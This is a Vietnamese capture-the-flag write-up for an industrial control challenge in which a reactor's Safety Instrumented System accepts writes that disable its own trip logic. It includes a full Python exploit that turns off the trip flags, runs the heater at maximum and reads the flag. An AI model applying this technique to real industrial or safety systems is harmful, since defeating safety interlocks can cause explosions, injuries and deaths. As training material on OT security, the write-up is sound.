# OT#004 — Chemical Reactor

**Flag:** CTF{59cbb10f52f0f0eb26f765b05b7144ed}  
**Service:** 169.58.126.107:6003  
**Định dạng flag:** CTF{...}

## Đề bài

> OT#004 — Chemical Reactor (briefing: Reactor SIS Briefing).

Service cung cấp giao diện điều khiển kiểu “OPC-UA” cho chemical reactor qua raw TCP. Một session có thể browse, read và write cả process controller lẫn Safety Instrumented System (SIS). Đây là lỗi process safety chứ không phải memory safety: SIS nhận các write vận hành làm vô hiệu chính cơ chế bảo vệ của nó; sau đó heater đẩy reactor vượt trip point. Flag là node trên SIS và chỉ xuất hiện khi reactor ở trạng thái nguy hiểm.

## Phân tích

### Framing

Mỗi request là [1 byte opcode][4 byte length little-endian][payload]; response là [opcode | 0x80][4 byte length][payload]. Opcode:

| Opcode | Thao tác | Payload | Response payload |
|---:|---|---|---|
| 1 | Handshake | rỗng | u32 session_id |
| 2 | Browse | u32 session, u16 ns, u32 node | u8 status, u16 count, entries[] |
| 3 | Read | u32 session, u16 ns, u32 node | u8 status, u8 type, value |
| 4 | Write | u32 session, u16 ns, u32 node, u8 type, value | u8 status |

Browse entry có dạng u16 ns, u32 node, u16 class, u8 name_len, name. Write type: 1 = int32, 2 = double, 3 = bool, 4 = string (u16 length rồi tới bytes). Status quan sát thực tế:

| Status | Ý nghĩa |
|---:|---|
| 0 | thành công |
| 1 | node không tồn tại |
| 3 | write bị chặn (node chỉ đọc) |
| 4 | session không hợp lệ |
| 5 | type mismatch |

Session gắn với TCP connection và tồn tại qua nhiều request, nhưng gọi op1 lần nữa sẽ thay session id cũ.

### Logic protection

TripSetpoint = 350.0; ghi vào node này bị từ chối với status 3 nên không thể nâng threshold. HeaterPower bị giới hạn ở 100. Trong vận hành bình thường, SIS ngắt heater khi Temperature vượt setpoint và latch Tripped.

Điểm yếu là SIS để các operating flag trong cùng writable address space với process value. Chỉ cần sửa các giá trị sau là trip logic không còn tác dụng:

* TripEnable = 0 — tắt hẳn trip output.
* Permissive = 0 — bỏ điều kiện permissive cần để trip hoạt động.
* PretripLatch = 0 — ngăn trip latch.
* CalibrationHold = 1 — đặt SIS vào chế độ calibration, tạm giữ trip function.

Với các giá trị này, HeaterPower = 100 đẩy nhiệt độ qua 500°C trong khi Tripped vẫn là 0.

### Flag

Flag (ns=2, id=2004) là string node. Ở trạng thái bình thường nó trả chuỗi rỗng; chỉ có flag khi reactor đang giữ ở tình trạng nguy hiểm. Node này động: khi reactor nguội hoặc reset, nội dung bị xóa, nên phải đọc lúc nhiệt độ vẫn cao.

## Lời giải

1. Kết nối và handshake để lấy session id.
2. Browse root, controller và SIS để xác nhận node id.
3. Ghi TripEnable=0, Permissive=0, PretripLatch=0, CalibrationHold=1 (đều là bool write, type 3).
4. Ghi HeaterPower=100.0 (double, type 2).
5. Poll Flag cho tới khi trả string không rỗng (type 4, có u16 length prefix).

```python
import socket, struct, time

HOST, PORT = "169.58.126.107", 6003

def recvn(s, n, timeout=1.0):
    s.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        try:
            d = s.recv(n - len(buf))
        except socket.timeout:
            return None
        if not d:
            return b""
        buf += d
    return buf

def call(s, op, payload):
    s.sendall(bytes([op]) + struct.pack("<I", len(payload)) + payload)
    h = recvn(s, 1)
    if not h:
        raise ConnectionError("closed")
    n = struct.unpack("<I", recvn(s, 4))[0]
    return recvn(s, n) if n else b""

def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    sid = struct.unpack("<I", call(s, 1, b"")[:4])[0]
    return s, sid

def browse(s, sid, ns, nid):
    b = call(s, 2, struct.pack("<I", sid) + struct.pack("<HI", ns, nid))
    assert b[4] == 0, b.hex()
    cnt = struct.unpack("<H", b[5:7])[0]
    p, out = 7, []
    for _ in range(cnt):
        ens, enid, _cls = struct.unpack("<HIH", b[p:p + 8]); p += 8
        nl = b[p]; p += 1
        out.append((ens, enid, b[p:p + nl].decode())); p += nl
    return out

def read(s, sid, ns, nid):
    b = call(s, 3, struct.pack("<I", sid) + struct.pack("<HI", ns, nid))
    assert b[4] == 0, b.hex()
    return b[5], b[6:]          # type, value

def write(s, sid, ns, nid, typ, val):
    b = call(s, 4, struct.pack("<I", sid) + struct.pack("<HI", ns, nid)
             + bytes([typ]) + val)
    return b[4]                 # status

s, sid = connect()
print("[*] Objects:", browse(s, sid, 0, 85))
print("[*] Reactor:", browse(s, sid, 1, 1000))
print("[*] SIS    :", browse(s, sid, 2, 2000))

# 1) Disable the SIS protection
for nid, v in [(2001, 0), (2007, 0), (2008, 0), (2010, 1)]:
    assert write(s, sid, 2, nid, 3, bytes([v])) == 0

# 2) Drive the heater to the maximum (clamped at 100)
assert write(s, sid, 1, 1001, 2, struct.pack("<d", 100.0)) == 0

# 3) Wait for the flag
for _ in range(40):
    typ, val = read(s, sid, 2, 2004)
    if typ == 4:
        n = struct.unpack("<H", val[:2])[0]
        if n:
            print("[+] FLAG:", val[2:2 + n].decode())
            break
    time.sleep(0.5)
```

## Ghi chú

* Flag có trạng thái động. Đọc sau khi reactor nguội hoặc reset sẽ nhận chuỗi rỗng; cần capture khi trạng thái nguy hiểm còn tồn tại.
* TripSetpoint chỉ đọc (status 3), HeaterPower bị giới hạn ở 100. Không cần vượt qua hai ràng buộc này; exploit bỏ qua logic dùng setpoint.
* Khi khảo sát service tương tự, nên browse SIS và process controller trong cùng session. Nếu cả hai namespace cùng ghi được qua một kết nối thì ranh giới an toàn chỉ tồn tại trên danh nghĩa.
